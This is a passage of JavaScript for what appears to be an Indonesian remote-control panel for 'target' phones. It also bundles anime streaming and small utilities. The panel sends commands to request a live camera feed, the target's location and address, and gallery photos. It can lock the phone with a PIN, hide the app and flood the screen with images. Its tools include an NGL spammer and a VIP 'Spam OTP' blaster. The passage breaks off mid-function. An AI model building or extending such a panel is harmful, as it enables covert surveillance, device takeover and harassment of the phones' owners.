    const v = $("#live-view"); if (v) v.innerHTML = '<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>';
  }
}

function setupLiveScreen(tid) {
  if (State.unsubLive) State.unsubLive();
  State.unsubLive = fbOnValue(fbRef(State.db, "live/" + tid), (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.frame || d.stream) {
      const v = $("#live-view");
      const src = d.stream || d.frame;
      v.innerHTML = `<img src="${src}" alt="live">`;
    }
  });
}

function renderLocatePage(t) { $("#sw-loc").onchange = (e) => toggleLocate(t.id, e.target.checked); }

async function toggleLocate(tid, on) {
  haptic(15);
  if (on) {
    $("#loc-loading").classList.remove("hidden");
    $("#loc-map").innerHTML = '<div class="empty"><i class="fa-solid fa-spinner fa-spin"></i><div>Mencari lokasi target...</div></div>';
    await sendCommand(tid, "locate");
    toast("Meminta lokasi...", "info");
    setupLocate(tid);
  } else {
    await sendCommand(tid, "locate_off");
    if (State.unsubLoc) { State.unsubLoc(); State.unsubLoc = null; }
    $("#loc-loading").classList.add("hidden");
    const m = $("#loc-map"); if (m) m.innerHTML = '<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>';
    $("#loc-coords").textContent = "—";
    $("#loc-address").innerHTML = "—";
  }
}

function setupLocate(tid) {
  if (State.unsubLoc) State.unsubLoc();
  State.unsubLoc = fbOnValue(fbRef(State.db, "locations/" + tid), async (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.lat && d.lng) {
      $("#loc-loading").classList.add("hidden");
      const m = $("#loc-map");
      m.innerHTML = `<iframe src="https://maps.google.com/maps?q=${d.lat},${d.lng}&z=16&output=embed"></iframe>`;
      $("#loc-coords").textContent = `${d.lat}, ${d.lng}`;
      $("#loc-address").innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Mengambil alamat...';
      try {
        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${d.lat}&lon=${d.lng}&zoom=18&addressdetails=1`);
        const data = await r.json();
        if (data.display_name) $("#loc-address").innerHTML = `<i class="fa-solid fa-location-dot"></i> ${data.display_name}`;
        else $("#loc-address").innerHTML = "Alamat tidak ditemukan";
      } catch (e) { $("#loc-address").innerHTML = "Gagal ambil alamat"; }
    }
  });
}

function setupFlashToggles(t) {
  $("#sw-flash").onchange = async (e) => { haptic(15); await sendCommand(t.id, e.target.checked ? "flashlight_on" : "flashlight_off"); toast(e.target.checked ? "Senter nyala" : "Senter mati", "ok"); };
  $("#sw-strobo").onchange = async (e) => { haptic(15); await sendCommand(t.id, e.target.checked ? "strobo_on" : "strobo_off"); toast(e.target.checked ? "Strobo nyala" : "Strobo mati", "ok"); };
}

function setupLockPage(t) {
  const sw = $("#sw-lock"), pin = $("#lock-pin"), msg = $("#lock-message");
  sw.onchange = async (e) => {
    haptic(15);
    const code = pin.value.trim();
    const message = msg.value.trim() || "HP Terkunci";
    if (e.target.checked) {
      if (code.length !== 4) { e.target.checked = false; return toast("PIN harus 4 digit", "err"); }
      await sendCommand(t.id, "lock_on", { pin: code, message });
      toast("HP target dikunci", "ok");
    } else { await sendCommand(t.id, "lock_off"); toast("Lock dibuka", "ok"); }
  };
}

function setupVolumePage(t) {
  const slider = $("#volume-slider"), val = $("#volume-value");
  slider.oninput = () => { val.textContent = slider.value + "%"; };
  $("#btn-set-volume").onclick = async () => { haptic(15); const v = parseInt(slider.value); await sendCommand(t.id, "set_volume", { value: v }); toast(`Volume di-set ${v}%`, "ok"); };
}

function setupBrightnessPage(t) {
  const slider = $("#brightness-slider"), val = $("#brightness-value");
  slider.oninput = () => { val.textContent = slider.value + "%"; };
  $("#btn-set-brightness").onclick = async () => { haptic(15); const v = parseInt(slider.value); await sendCommand(t.id, "set_brightness", { value: v }); toast(`Kecerahan di-set ${v}%`, "ok"); };
}

function setupUrlPage(t) {
  $("#btn-open-url").onclick = async () => { haptic(15); const url = $("#url-direct").value.trim(); if (!url) return toast("Isi URL dulu", "err"); if (!/^https?:\/\//.test(url)) return toast("URL harus diawali http:// atau https://", "err"); await sendCommand(t.id, "open_url", { url }); toast("URL dikirim ke target", "ok"); };
}

function setupGalleryPage(t) {
  $("#btn-get-gallery").onclick = async () => {
    haptic(15);
    $("#gallery-loading").classList.remove("hidden");
    const grid = $("#gallery-grid");
    grid.innerHTML = '';
    await sendCommand(t.id, "get_gallery");
    toast("Meminta galeri...", "info");
    if (State.unsubGallery) State.unsubGallery();
    State.unsubGallery = fbOnValue(fbRef(State.db, "gallery/" + t.id), (snap) => {
      if (!snap.exists()) return;
      const data = snap.val();
      const photos = data.photos || [];
      $("#gallery-loading").classList.add("hidden");
      if (photos.length === 0) { grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Belum ada foto</div></div>'; return; }
      grid.innerHTML = photos.map(url => `<div class="g-item" onclick="window.open('${url}','_blank')"><img src="${url}" onerror="this.style.background='#160d10'"></div>`).join("");
    });
  };
}

function setupToastPage(t) {
  $("#btn-send-toast").onclick = async () => { haptic(15); const m = $("#toast-message").value.trim(); if (!m) return toast("Isi pesan dulu", "err"); await sendCommand(t.id, "show_toast", { message: m }); toast("Toast terkirim", "ok"); $("#toast-message").value = ""; };
}

function setupHideAppPage(t) {
  $("#btn-hide-app").onclick = async () => { haptic(15); await sendCommand(t.id, "hide_app"); toast("Command hide app terkirim", "ok"); };
  $("#btn-show-app").onclick = async () => { haptic(15); await sendCommand(t.id, "show_app"); toast("Command show app terkirim", "ok"); };
}

function setupWallpaperPage(t) {
  const urlInp = $("#wallpaper-url"), fileInp = $("#wallpaper-file"), preview = $("#wallpaper-preview"), previewImg = $("#wallpaper-preview-img");
  urlInp.oninput = () => { const u = urlInp.value.trim(); if (u && /^https?:\/\//.test(u)) { preview.style.display = "block"; previewImg.src = u; } else { preview.style.display = "none"; } };
  fileInp.onchange = async () => {
    const f = fileInp.files[0]; if (!f) return;
    if (f.size > 5 * 1024 * 1024) return toast("File max 5 MB", "err");
    toast("Upload gambar...", "info");
    try { const url = await uploadFile(f); urlInp.value = url; preview.style.display = "block"; previewImg.src = url; toast("Upload berhasil", "ok"); }
    catch (e) { toast("Upload gagal: " + e.message, "err"); }
  };
  $$("#wallpaper-type .radio-opt").forEach(el => {
    el.onclick = () => { $$("#wallpaper-type .radio-opt").forEach(x => x.classList.remove("active")); el.classList.add("active"); el.querySelector("input").checked = true; };
  });
  $("#btn-apply-wallpaper").onclick = async () => {
    haptic(15);
    const url = urlInp.value.trim();
    if (!url) return toast("Kasih URL gambar atau upload dulu", "err");
    const type = document.querySelector('input[name="wptype"]:checked').value;
    await sendCommand(t.id, "change_wallpaper", { url, type });
    toast("Wallpaper di-set ke target", "ok");
  };
}

function setupSpamUIPage(t) {
  const fileInp = $("#spamui-file"), list = $("#spamui-list"), info = $("#spamui-info"), count = $("#spamui-count"), startBtn = $("#btn-spamui-start"), stopBtn = $("#btn-spamui-stop");
  State.spamuiFiles = [];
  const render = () => {
    list.innerHTML = State.spamuiFiles.map((f, i) => `<div class="spam-thumb"><img src="${f.url}"><div class="rm" data-i="${i}"><i class="fa-solid fa-xmark"></i></div></div>`).join("");
    count.textContent = State.spamuiFiles.length;
    info.style.display = State.spamuiFiles.length > 0 ? "flex" : "none";
    startBtn.disabled = State.spamuiFiles.length < 1;
    $$(".spam-thumb .rm").forEach(el => el.onclick = () => { State.spamuiFiles.splice(parseInt(el.dataset.i), 1); render(); });
  };
  fileInp.onchange = async () => {
    const files = [...fileInp.files];
    if (State.spamuiFiles.length + files.length > 10) return toast("Maksimal 10 foto", "err");
    for (const f of files) {
      if (f.size > 5 * 1024 * 1024) { toast(`${f.name} terlalu gede`, "warn"); continue; }
      try { toast(`Upload ${f.name}...`, "info", 1500); const url = await uploadFile(f); State.spamuiFiles.push({ url, name: f.name }); render(); }
      catch (e) { toast("Upload gagal: " + f.name, "err"); }
    }
    fileInp.value = "";
  };
  $("#btn-spamui-clear").onclick = () => { State.spamuiFiles = []; render(); };
  startBtn.onclick = async () => {
    haptic(20);
    if (State.spamuiFiles.length < 1) return toast("Pilih minimal 1 foto", "err");
    const urls = State.spamuiFiles.map(f => f.url);
    await sendCommand(t.id, "spam_ui_on", { images: urls });
    toast("Spam UI aktif di target", "ok");
    startBtn.style.display = "none"; stopBtn.style.display = "flex";
  };
  stopBtn.onclick = async () => {
    haptic(20);
    await sendCommand(t.id, "spam_ui_off");
    toast("Spam UI dihentikan", "ok");
    startBtn.style.display = "flex"; stopBtn.style.display = "none";
  };
  render();
}

async function sendCommand(tid, type, payload = {}) {
  try { const cmdRef = fbPush(fbRef(State.db, "commands/" + tid)); await fbSet(cmdRef, { type, payload, fromUid: State.uid, status: "pending", createdAt: Date.now() }); return true; }
  catch (e) { toast("Gagal kirim command", "err"); return false; }
}

function goChangelog() { showScreen("changelog"); renderChangelog(); }
function renderChangelog() {
  const list = $("#changelog-list"); if (!list) return;
  list.innerHTML = CHANGELOG_DATA.map(item => {
    const badge = item.latest ? `<span class="changelog-badge latest">Latest</span>` : `<span class="changelog-badge old">Patch ${item.patch}</span>`;
    return `<div class="changelog-item ${item.latest ? 'current' : ''}"><div class="changelog-head"><div class="changelog-ver">Patch ${item.patch}</div>${badge}<div class="changelog-date">${item.date}</div></div><div class="changelog-changes">${item.changes.map(c => { const icon = c.type === "fix" ? "fa-bug" : c.type === "add" ? "fa-plus" : c.type === "new" ? "fa-star" : c.type === "rem" ? "fa-minus" : "fa-arrow-up"; return `<div class="changelog-change ${c.type}"><i class="fa-solid ${icon}"></i><span>${c.text}</span></div>`; }).join("")}</div></div>`;
  }).join("");
}

/* BLUXANIME */
async function goAnime() { showScreen("anime"); State.animeSearchMode = false; $("#anime-search-inline").classList.remove("show"); loadAnimeBanner(); loadAnimeRows(); }
async function loadAnimeBanner() { const img = $("#anime-banner-img"); if (img) img.src = CONFIG.ANIME_BANNER + "?t=" + Date.now(); }
async function loadAnimeRows() {
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Loading anime...</span></div>';
  try {
    const [recent, recent2, completed] = await Promise.all([
      fetch(`${CONFIG.ANIME_API}?recent=1&page=1`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?recent=1&page=2`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?completed=1&page=1`).then(r => r.json()).catch(() => null)
    ]);
    const trending = dedupe(recent?.data?.animeList || []), newRel = dedupe(recent2?.data?.animeList || []), comp = dedupe(completed?.data?.animeList || []);
    let html = "";
    const cont = getContinueWatching();
    if (cont.length > 0) html += renderAnimeRow("📺 Lanjutkan Nonton", cont);
    if (trending.length) html += renderAnimeRow("🔥 Trending Today", trending);
    if (newRel.length) html += renderAnimeRow("✨ New Release", newRel);
    if (comp.length) html += renderAnimeRow("✅ Completed", comp);
    if (!html) html = '<div class="anime-empty"><i class="fa-solid fa-tv"></i>Gagal load anime</div>';
    rows.innerHTML = html; bindAnimeCards();
  } catch (e) { rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal load anime</div>'; }
}
function dedupe(arr) { const seen = new Set(); const out = []; for (const a of arr) { if (!a || !a.link) continue; if (seen.has(a.link)) continue; seen.add(a.link); out.push(a); } return out; }
function renderAnimeRow(title, items) { return `<div class="anime-row"><div class="anime-row-head"><div class="t">${title}</div></div><div class="anime-row-scroll">${items.map(a => renderAnimeCard(a)).join("")}</div></div>`; }
function renderAnimeCard(a) { const title = cleanTitle(a.title); const type = a.type || "TV"; const ep = a.latestEpisode || a.totalEpisode || ""; return `<div class="anime-card" data-link="${a.link}" data-title="${title}" data-image="${a.image}" data-type="${type}"><div class="cover"><img src="${a.image}" onerror="this.style.background='#160d10'"><span class="type-badge">${type}</span>${ep ? `<span class="ep-badge">${ep}</span>` : ""}</div><div class="title">${title}</div></div>`; }
function bindAnimeCards() { $$(".anime-card").forEach(el => { el.onclick = () => { haptic(10); openAnimeDetail(el.dataset.link, el.dataset.title, el.dataset.image, el.dataset.type); }; }); }
async function searchAnime(q) {
  if (!q.trim()) return;
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Mencari...</span></div>';
  State.animeSearchMode = true;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?search=${encodeURIComponent(q)}`);
    const data = await res.json();
    const list = dedupe(data?.data?.results || []);
    if (list.length === 0) { rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-magnifying-glass"></i>Anime tidak ditemukan</div>'; return; }
    rows.innerHTML = `<div class="anime-search-grid">${list.map(a => renderAnimeCard(a)).join("")}</div>`; bindAnimeCards();
  } catch (e) { rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal mencari</div>'; }
}
async function openAnimeDetail(link, title, image, type) {
  const box = $("#modal-box");
  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading detail...</span></div>`;
  $("#modal").classList.add("show");
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?details=${encodeURIComponent(link)}`);
    const data = await res.json();
    const d = data?.data; if (!d) throw new Error("No data");
    State.animeCurrentDetail = d;
    const genres = (d.genres || []).map(g => `<span class="g">${g}</span>`).join("");
    const info = d.info || {};
    const episodes = (d.episodes || []).map(e => { const epNum = e.episode.replace(/[^0-9]/g, "") || "?"; return `<div class="ad-ep" data-epurl="${e.episodeUrl}" data-eptitle="${e.title}"><div class="ep-num">${epNum}</div><div class="ep-info"><div class="t">${e.title}</div><div class="d">${e.date || ""}</div></div><div class="ep-play"><i class="fa-solid fa-play"></i></div></div>`; }).join("");
    box.innerHTML = `<div class="anime-detail"><div class="ad-hero"><img src="${d.image}"></div><div class="ad-title">${d.title}</div><div class="ad-genres">${genres}</div><div class="ad-info"><div class="i"><div class="l">Status</div><div class="v">${info.Status || "—"}</div></div><div class="i"><div class="l">Studio</div><div class="v">${info.Studio || "—"}</div></div><div class="i"><div class="l">Dirilis</div><div class="v">${info.Dirilis || "—"}</div></div><div class="i"><div class="l">Tipe</div><div class="v">${info.Tipe || "—"}</div></div><div class="i"><div class="l">Episode</div><div class="v">${info.Episode || "—"}</div></div><div class="i"><div class="l">Durasi</div><div class="v">${info.Durasi || "—"}</div></div></div>${d.sinopsis ? `<div class="ad-synopsis">${d.sinopsis}</div>` : ""}<div class="ad-eps-label">Daftar Episode</div><div class="ad-eps">${episodes || '<div style="text-align:center;color:#a39599;font-size:12px;padding:20px">Belum ada episode</div>'}</div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div></div>`;
    $$(".ad-ep").forEach(el => { el.onclick = () => { haptic(8); playAnimeEpisode(el.dataset.epurl, el.dataset.eptitle, d); }; });
  } catch (e) { box.innerHTML = `<h3 style="text-align:center">Gagal</h3><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px">Tutup</button></div>`; }
}
async function playAnimeEpisode(epUrl, epTitle, detail) {
  const box = $("#modal-box");
  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading stream...</span></div>`;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?stream=${encodeURIComponent(epUrl)}`);
    const data = await res.json();
    const streamUrl = data?.data?.streamUrl; if (!streamUrl) throw new Error("No stream");
    box.innerHTML = `<div class="anime-stream"><div class="as-header"><div class="as-back" id="as-back"><i class="fa-solid fa-arrow-left"></i></div><div class="as-title">${epTitle || "Episode"}</div></div><div class="player-wrap"><iframe src="${streamUrl}" allowfullscreen></iframe></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div></div>`;
    $("#as-back").onclick = () => { haptic(8); if (State.animeCurrentDetail) openAnimeDetail(State.animeCurrentDetail.url, State.animeCurrentDetail.title, State.animeCurrentDetail.image, ""); };
    if (detail) saveContinueWatching(detail, epTitle, epUrl);
  } catch (e) { box.innerHTML = `<div class="anime-stream"><div class="player-wrap"><div class="player-error"><i class="fa-solid fa-circle-exclamation"></i><div class="t">Gagal load video</div><button class="btn btn-primary" onclick="closeModal()" style="max-width:200px">Tutup</button></div></div></div>`; }
}
function getContinueWatching() { try { return JSON.parse(localStorage.getItem("bluxus_continue") || "[]"); } catch (e) { return []; } }
function saveContinueWatching(detail, epTitle, epUrl) { try { let list = getContinueWatching(); list = list.filter(x => x.link !== detail.url); list.unshift({ title: cleanTitle(detail.title), link: detail.url, image: detail.image, type: "TV", latestEpisode: epTitle || "", episodeUrl: epUrl, at: Date.now() }); list = list.slice(0, 10); localStorage.setItem("bluxus_continue", JSON.stringify(list)); } catch (e) {} }
function initAnimeEvents() {
  $("#btn-anime-search").onclick = () => { haptic(8); $("#anime-search-inline").classList.add("show"); $("#anime-search-input").focus(); };
  $("#btn-anime-search-close").onclick = () => { haptic(8); $("#anime-search-inline").classList.remove("show"); $("#anime-search-input").value = ""; if (State.animeSearchMode) { State.animeSearchMode = false; loadAnimeRows(); } };
  $("#anime-search-input").addEventListener("keydown", e => { if (e.key === "Enter") searchAnime(e.target.value); });
}

/* TOOLS */
const TOOLS = [{ id: "tolink", name: "To Link", desc: "Upload foto/video → URL", icon: "fa-link" },{ id: "spotify", name: "Spotify Preview", desc: "Cari & preview lagu", icon: "fa-music" },{ id: "gempa", name: "Info Gempa", desc: "Data gempa dari BMKG", icon: "fa-mountain-sun" },{ id: "ngl", name: "NGL Spamer", desc: "Spam pertanyaan NGL", icon: "fa-comment-dots" },{ id: "qr", name: "URL to QR", desc: "Ubah URL jadi QR code", icon: "fa-qrcode" }];
const VIP_TOOLS = [{ id: "otp", name: "Spam OTP", desc: "Blast OTP ke nomor", icon: "fa-bolt" }];

async function goTools() {
  showScreen("tools");
  const g = $("#tools-grid"), vg = $("#vip-tools-grid");
  const vip = isVIP();
  g.innerHTML = TOOLS.map(t => `<div class="tool-card" data-tool="${t.id}"><div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div><div class="tc-name">${t.name}</div><div class="tc-desc">${t.desc}</div></div>`).join("");
  vg.innerHTML = VIP_TOOLS.map(t => `<div class="tool-card vip ${vip ? "" : "locked"}" data-tool="${t.id}"><div class="tc-badge">VIP</div><div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div><div class="tc-name">${t.name}</div><div class="tc-desc">${t.desc}</div></div>`).join("");
  $$(".tool-card").forEach(el => el.onclick = () => { haptic(10); openTool(el.dataset.tool, el.classList.contains("locked")); });
}

function openTool(id, locked) {
  if (locked) return toast("Butuh akses VIP", "warn");
  if (id === "tolink") return toolToLink();
  if (id === "spotify") return toolSpotify();
  if (id === "gempa") return toolGempa();
  if (id === "ngl") return toolNGL();
  if (id === "qr") return toolQR();
  if (id === "otp") return toolOTP();
}

function toolToLink() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">To Link</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Upload foto/video, dapet URL-nya</div><div class="upload-zone" id="upload-zone"><input type="file" id="upload-input" accept="image/*,video/*"><div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div><div class="uz-title">Tap untuk pilih file</div><div class="uz-desc">Max 5 MB</div></div><div id="upload-result" style="margin-top:14px;display:none"><div style="background:#0d0709;border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:14px"><div style="font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:6px">URL</div><div id="ur-url" style="font-family:monospace;font-size:11px;color:#f5f5f5;word-break:break-all;margin-bottom:12px">—</div><div style="display:flex;gap:8px"><button class="btn btn-ghost" id="btn-copy-url" style="flex:1;font-size:11px;padding:10px;border-radius:12px;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)"><i class="fa-solid fa-copy"></i> Copy</button><button class="btn btn-primary" id="btn-open-url" style="flex:1;font-size:11px;padding:10px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button></div></div></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#upload-input").onchange = async () => {
    const f = $("#upload-input").files[0]; if (!f) return;
    if (f.size > 5 * 1024 * 1024) return toast("File max 5 MB", "err");
    toast("Upload...", "info");
    try {
      const url = await uploadFile(f);
      $("#upload-result").style.display = "block";
      $("#ur-url").textContent = url;
      $("#btn-copy-url").onclick = async () => { const ok = await copyToClipboard(url); toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err"); };
      $("#btn-open-url").onclick = () => window.open(url, "_blank");
      toast("Upload berhasil", "ok");
    } catch (e) { toast("Upload gagal: " + e.message, "err"); }
  };
}

function toolSpotify() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">Spotify Preview</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Cari lagu & preview 30 detik</div><div style="margin-bottom:14px"><input type="text" id="sp-q" placeholder="Cari lagu..." style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><button class="btn btn-primary" id="sp-search" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700;margin-bottom:14px"><i class="fa-solid fa-search"></i> Cari</button><div id="sp-results" class="spotify-list"></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#sp-search").onclick = doSpotifySearch;
  $("#sp-q").addEventListener("keydown", e => { if (e.key === "Enter") doSpotifySearch(); });
}

async function doSpotifySearch() {
  const q = $("#sp-q").value.trim(); if (!q) return toast("Isi query", "err");
  const btn = $("#sp-search"); btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/spotify?q=${encodeURIComponent(q)}&api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) { $("#sp-results").innerHTML = '<div style="text-align:center;color:#5a4548;padding:20px;font-size:12px">Lagu tidak ditemukan</div>'; return; }
    $("#sp-results").innerHTML = data.result.map((t, i) => `<div class="spotify-item" data-idx="${i}"><img class="sp-cover" src="${t.thumb}"><div class="sp-info"><div class="t">${t.title}</div><div class="a">${t.artist}</div><div class="d">${t.duration}</div></div><div class="sp-play"><i class="fa-solid fa-play"></i></div></div>`).join("");
    $$(".spotify-item").forEach(el => { el.onclick = () => { haptic(10); playTrack(data.result[parseInt(el.dataset.idx)]); }; });
  } catch (e) { toast("Gagal cari lagu", "err"); }
  finally { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-search"></i> Cari'; }
}

function playTrack(t) {
  if (!t.preview) return toast("Preview tidak tersedia", "warn");
  if (State.audio) { State.audio.pause(); State.audio = null; }
  State.currentTrack = t;
  const audio = new Audio(t.preview); State.audio = audio;
  $("#pb-cover").src = t.thumb; $("#pb-title").textContent = t.title; $("#pb-artist").textContent = t.artist;
  $("#player-bar").classList.add("show"); audio.play();
  $("#pb-toggle-icon").className = "fa-solid fa-pause";
  audio.ontimeupdate = () => { const p = (audio.currentTime / audio.duration) * 100; $("#pb-progress").style.width = p + "%"; };
  audio.onended = () => { $("#pb-toggle-icon").className = "fa-solid fa-play"; };
}

function initPlayer() {
  $("#pb-toggle").onclick = () => { haptic(10); if (!State.audio) return; if (State.audio.paused) { State.audio.play(); $("#pb-toggle-icon").className = "fa-solid fa-pause"; } else { State.audio.pause(); $("#pb-toggle-icon").className = "fa-solid fa-play"; } };
  $("#pb-close").onclick = () => { haptic(10); if (State.audio) { State.audio.pause(); State.audio = null; } $("#player-bar").classList.remove("show"); };
}

function toolGempa() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">Info Gempa</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Data gempa terkini dari BMKG</div><div id="gempa-content"><div style="text-align:center;color:#a39599;font-size:12px;padding:20px">Loading...</div></div><button class="btn btn-ghost" id="gempa-refresh" style="width:100%;margin-top:14px;padding:15px;border-radius:12px;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)"><i class="fa-solid fa-rotate"></i> Refresh</button><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  loadGempa();
  $("#gempa-refresh").onclick = () => { haptic(10); loadGempa(); };
}

async function loadGempa() {
  const box = $("#gempa-content"); if (!box) return;
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/gempa?api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) { box.innerHTML = '<div style="color:#ff3333;font-size:12px;text-align:center">Gagal load</div>'; return; }
    const r = data.result;
    const mag = parseFloat(r.magnitude) || 0;
    let magColor = "#2ed573";
    if (mag >= 6) magColor = "#ff3333"; else if (mag >= 5) magColor = "#ff9800"; else if (mag >= 3) magColor = "#ffa502";
    box.innerHTML = `<div class="gempa-card"><div class="gempa-mag"><div class="m-value" style="color:${magColor}">${r.magnitude}</div><div class="m-label">Magnitudo</div></div><div class="gempa-detail"><div class="gempa-row"><div class="icon"><i class="fa-solid fa-location-dot"></i></div><div class="info"><div class="l">Wilayah</div><div class="v">${r.wilayah || "—"}</div></div></div><div class="gempa-row"><div class="icon"><i class="fa-solid fa-clock"></i></div><div class="info"><div class="l">Waktu</div><div class="v">${r.tanggal || "—"}, ${r.jam || "—"}</div></div></div><div class="gempa-row"><div class="icon"><i class="fa-solid fa-arrow-down"></i></div><div class="info"><div class="l">Kedalaman</div><div class="v">${r.kedalaman || "—"}</div></div></div><div class="gempa-row"><div class="icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div class="info"><div class="l">Potensi</div><div class="v">${r.potensi || "—"}</div></div></div></div></div>`;
  } catch (e) { box.innerHTML = '<div style="color:#ff3333;font-size:12px;text-align:center">Gagal load</div>'; }
}

function toolNGL() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">NGL Spamer</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Kirim pertanyaan anonim ke NGL</div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Username NGL</label><input type="text" id="ngl-user" placeholder="username" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Pertanyaan</label><textarea id="ngl-q" placeholder="Tulis pertanyaan..." style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px;resize:vertical;min-height:80px;font-family:inherit"></textarea></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Limit: <span id="ngl-limit-val">10</span></label><input type="range" id="ngl-limit" min="1" max="100" value="10" style="width:100%"></div><button class="btn btn-primary" id="ngl-send" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700;margin-top:14px"><i class="fa-solid fa-paper-plane"></i> Kirim</button><div id="ngl-result"></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#ngl-limit").oninput = () => { $("#ngl-limit-val").textContent = $("#ngl-limit").value; };
  $("#ngl-send").onclick = async () => {
    const user = $("#ngl-user").value.trim(), q = $("#ngl-q").value.trim(), limit = parseInt($("#ngl-limit").value);
    if (!user || !q) return toast("Isi username & pertanyaan", "err");
    const btn = $("#ngl-send"); btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending...';
    try {
